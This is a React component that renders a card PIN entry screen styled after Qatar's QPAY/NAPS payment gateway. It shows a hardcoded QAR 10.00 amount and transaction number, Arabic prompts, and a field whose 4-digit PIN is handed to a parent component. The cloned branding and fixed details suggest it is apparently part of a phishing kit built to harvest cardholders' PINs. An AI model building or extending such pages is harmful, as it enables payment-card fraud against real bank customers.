
import React, { useState, useEffect } from 'react';

interface PINFormProps {
  onNext: () => void;
  onDataChange?: (data: { pin: string }) => void;
}

const PINForm: React.FC<PINFormProps> = ({ onNext, onDataChange }) => {
  const [pin, setPin] = useState('');

  // Send data to parent when it changes
  useEffect(() => {
    if (onDataChange) {
      onDataChange({ pin });
    }
  }, [pin, onDataChange]);

  return (
    <div className="w-full bg-[#f8f9fa] flex flex-col items-center pt-0 pb-8 px-4 md:px-8 font-sans" dir="rtl">
      <div className="w-full max-w-[850px]">
        
        {/* Unified Summary Header based on provided image */}
        <div className="flex flex-col items-start mb-8 px-2 gap-4">
          {/* Top: Logo and Amount */}
          <div className="flex items-center justify-between w-full gap-6">
            <div className="flex flex-col items-start">
              <div className="text-[#640d2b] text-[16px] font-bold mb-1">Amount</div>
              <div className="text-[#640d2b] text-[28px] font-bold leading-tight">QAR 10.00</div>
            </div>
            <img 
              src="/qpay.png" 
              alt="QPAY Logo" 
              className="h-[42px] w-auto"
            />
          </div>

          {/* Bottom: Transaction Details */}
          <div className="space-y-1 text-left w-full" dir="ltr">
            <div className="text-[14px] text-[#333]">
              <span className="font-bold">Payment Transaction Number:</span> <span className="font-medium">PRTALQ1768022149127</span>
            </div>
            <div className="text-[14px] text-[#333]">
              <span className="font-bold">Transaction Details:</span> <span className="font-medium">DC</span>
            </div>
          </div>
        </div>

        {/* PIN Container */}
        <div className="border border-[#640d2b] rounded-sm overflow-hidden bg-white shadow-sm">
          <div className="bg-[#640d2b] text-white px-5 py-3.5 text-right">
            <h2 className="text-[17px] font-medium tracking-tight">
              أدخل رمز PIN الخاص ببطاقتك
            </h2>
          </div>

          <div className="p-10 md:p-14 text-center">
            <div className="max-w-[600px] mx-auto space-y-8">
              <div className="space-y-1">
                <p className="text-[14px] font-bold text-[#333]">
                  يرجى إدخال رمز PIN المكون من 4 أرقام المرتبط ببطاقة الدفع الخاصة بك
                </p>
              </div>

              <div className="space-y-3 text-right max-w-[500px] mx-auto">
                <label className="block text-[14px] font-bold text-[#333]">
                  رمز PIN *
                </label>
                <input 
                  type="password"
                  maxLength={4}
                  className="w-full h-[40px] border border-gray-400 rounded-sm px-4 text-[18px] tracking-[10px] text-center outline-none focus:border-[#640d2b] focus:shadow-[0_0_1px_#640d2b] transition-all"
                  value={pin}
                  onChange={(e) => setPin(e.target.value.replace(/[^0-9]/g, ''))}
                  autoFocus
                />
              </div>

              <div className="flex justify-start items-center gap-6 pt-2 max-w-[500px] mx-auto flex-row-reverse">
                <img src="/naps.png" alt="NAPS" className="w-[180px] h-auto" />
              </div>

              <div className="max-w-[500px] mx-auto">
                <button 
                  disabled={pin.length < 4}
                  onClick={onNext}
                  className="w-full bg-[#640d2b] text-white font-bold py-2.5 rounded-sm text-[15px] hover:bg-[#4d0a21] transition-colors disabled:opacity-40 disabled:cursor-not-allowed tracking-wider shadow-sm"
                >
                  التحقق من رمز PIN
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PINForm;
